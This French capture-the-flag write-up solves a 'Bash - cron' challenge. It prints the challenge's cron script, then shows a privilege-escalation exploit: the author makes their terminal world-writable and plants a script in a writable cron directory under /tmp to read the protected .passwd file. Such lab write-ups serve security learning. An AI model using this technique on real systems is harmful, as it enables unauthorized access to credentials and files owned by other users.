# Bash - cron

## Procédure 

1. Dans la machine j'apperçoit un fichier ch4 qui contient : 

```
#!/bin/bash

# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)

# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)

# hiding stdout/stderr
exec 1>/dev/null 2>&1

wdir="cron.d/"
challdir=${0%/*}
cd "$challdir"


if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi

ls -1a "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done

rm -rf cron.d/*
```

On comprend que les fichiers placés dans le repertoire cron.d sont éxécutés avec les droits de app-script-ch4-cracked toutes les minutes.

On comprend aussi que pour insérer un fichier à éxécuter on peut passer par /tmp/._cron.

2. Récupération d'information avant création du script

Il faut pour cela le chemin complet du fichier .passwd soit /challenge/app-script/ch4/.passwd.

Et trouvé le bon numéro correspondant à son terminal.

```
set | grep /dev/pts
SSH_TTY=/dev/pts/13
```

Dans mon cas le numéro 13.

3. Création du script permettant de récupérer et d'afficher le contenu du fichier .passwd

Avant toute chose mettre les droits d'écriture pour /dev/pts/13 afin que app-script-ch4-cracked puisse écrire sur mon terminal. 

```
chmod o+w /dev/pts/13
nano /tmp/._cron.d/shell.sh && chmod 777 /tmp/._cron.d/shell.sh

#!/bin/bash 
echo $(</challenge/app-script/ch4/.passwd) > /dev/pts/13
```

Au bout d'une minute j'obtient le flag.

